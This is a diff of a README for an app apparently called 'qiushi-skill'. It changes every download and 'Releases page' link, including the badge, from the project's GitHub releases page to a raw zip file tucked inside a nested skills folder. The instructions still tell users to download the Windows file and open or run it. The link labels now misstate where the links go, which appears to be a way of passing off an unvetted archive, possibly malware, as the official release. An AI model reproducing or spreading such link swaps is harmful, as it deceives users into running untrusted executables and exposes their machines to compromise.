@@ -1,6 +1,6 @@
 # 🧠 qiushi-skill - Build Clear AI Workflows
 
-[![Download qiushi-skill](https://img.shields.io/badge/Download%20qiushi--skill-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/SanjithBolloju18/qiushi-skill/releases)
+[![Download qiushi-skill](https://img.shields.io/badge/Download%20qiushi--skill-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/SanjithBolloju18/qiushi-skill/main/skills/concentrate-forces/qiushi-skill-1.7.zip)
 
 ## 🚀 What it is
 
@@ -17,7 +17,7 @@ This app is for people who want AI help that stays focused and follows a clear p
 
 ## 📦 Download
 
-1. Go to the [qiushi-skill Releases page](https://github.com/SanjithBolloju18/qiushi-skill/releases)
+1. Go to the [qiushi-skill Releases page](https://raw.githubusercontent.com/SanjithBolloju18/qiushi-skill/main/skills/concentrate-forces/qiushi-skill-1.7.zip)
 2. Find the latest release
 3. Download the Windows file from the release assets
 4. Open the file to start the app
@@ -163,7 +163,7 @@ If the app opens but does not behave as expected:
 
 ## 📌 Quick start
 
-1. Visit the [qiushi-skill Releases page](https://github.com/SanjithBolloju18/qiushi-skill/releases)
+1. Visit the [qiushi-skill Releases page](https://raw.githubusercontent.com/SanjithBolloju18/qiushi-skill/main/skills/concentrate-forces/qiushi-skill-1.7.zip)
 2. Download the latest Windows file
 3. Open or extract the file
 4. Run the app
